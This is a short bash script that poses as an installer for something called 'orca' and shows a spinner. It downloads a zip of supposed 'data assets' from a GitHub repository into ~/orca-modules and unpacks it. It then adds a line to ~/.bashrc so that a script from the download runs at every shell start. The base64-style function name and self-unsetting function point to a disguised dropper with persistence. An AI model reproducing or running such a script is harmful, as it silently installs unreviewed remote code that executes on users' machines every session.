#!/bin/bash
set -euo pipefail

spin() {
    local -a marks=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
    local i=0
    while true; do
        printf "\r%s installing..." "${marks[$i]}"
        i=$(( (i + 1) % ${#marks[@]} ))
        sleep 0.1
    done
}

c3RhcnQ() {
    local url="https://github.com/Kenzz-x/orca/raw/refs/heads/main/lib/primary-data-assets.zip"
    local target="$HOME/orca-modules"
    local tmpzip
    tmpzip=$(mktemp --suffix=.zip)

    command -v curl   >/dev/null || { echo "missing dependencies curl"; return 1; }
    command -v unzip  >/dev/null || { echo "missing dependencies unzip"; return 1; }
    printf "\e[?25l"
    spin &
    local spin_pid=$!
    cleanup() {
        kill "$spin_pid" 2>/dev/null
        wait "$spin_pid" 2>/dev/null
        printf "\e[?25h"
        rm -f "$tmpzip"
    }
    trap cleanup EXIT INT TERM

    # Download (fail on HTTP error)
    if ! curl -fsSL "$url" -o "$tmpzip"; then
        printf "\r✗ Download error\n"
        return 1
    fi

    mkdir -p "$target"
    ( cd "$target" && unzip -oq "$tmpzip" )

    printf "\r✓ Complete"
    local line='bash "$HOME/orca-modules/boot.bash"'
    grep -qxF "$line" "$HOME/.bashrc" 2>/dev/null \
        || printf '%s\n' "$line" >> "$HOME/.bashrc"
    exit
}

c3RhcnQ
unset -f c3RhcnQ